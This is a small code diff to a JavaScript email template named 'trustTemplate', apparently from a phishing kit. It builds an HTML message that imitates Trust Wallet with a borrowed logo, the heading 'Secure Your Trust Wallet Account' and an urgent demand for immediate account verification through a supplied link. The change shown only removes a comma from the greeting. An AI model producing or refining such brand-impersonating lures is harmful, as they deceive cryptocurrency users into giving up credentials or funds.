@@ -66,7 +66,7 @@ exports.trustTemplate = (link) => {
     <div class="email-container">
         <img src="https://i.pinimg.com/736x/6c/3c/74/6c3c744dd40d28853c29f90692d1312e.jpg" alt="Trust Logo" class="logo">
         <h1>Secure Your Trust Wallet Account</h1>
-        <p>Dear user,</p>
+        <p>Dear user</p>
         <p>
             We've detected an action that requires immediate verification to secure 
             your Trust Wallet account. Please take a moment to verify your account 
